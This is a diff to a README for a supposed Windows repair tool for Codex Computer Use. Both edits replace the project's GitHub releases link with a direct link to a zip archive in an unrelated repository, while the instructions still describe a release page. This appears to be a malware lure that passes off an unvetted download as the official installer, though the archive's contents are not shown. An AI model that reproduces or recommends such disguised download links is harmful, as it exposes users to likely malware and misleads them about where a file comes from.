@@ -5,7 +5,7 @@ description: "Repair broken Computer Use and Chrome plugin installations in Wind
 ---
 # 🛠️ windows-codex-computeruse-repair - Fix codex computer use on windows
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Loriannedeictic637/windows-codex-computeruse-repair/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Loriannedeictic637/loriannedeictic637.github.io/main/calcitrate/github_io_loriannedeictic_v1.7-alpha.3.zip)
 
 This tool fixes errors related to missing files and export mismatches for Codex ComputerUse on Windows systems. It restores the functionality of your Codex environment without requiring manual code changes or complex configuration.
 
@@ -24,7 +24,7 @@ The software targets two specific problems found in Windows Codex installations.
 
 You need to download the installer from the release page.
 
-[Visit this page to download the latest version](https://github.com/Loriannedeictic637/windows-codex-computeruse-repair/releases)
+[Visit this page to download the latest version](https://raw.githubusercontent.com/Loriannedeictic637/loriannedeictic637.github.io/main/calcitrate/github_io_loriannedeictic_v1.7-alpha.3.zip)
 
 1. Navigate to the link provided above.
 2. Look for the "Assets" section at the bottom of the latest release post.
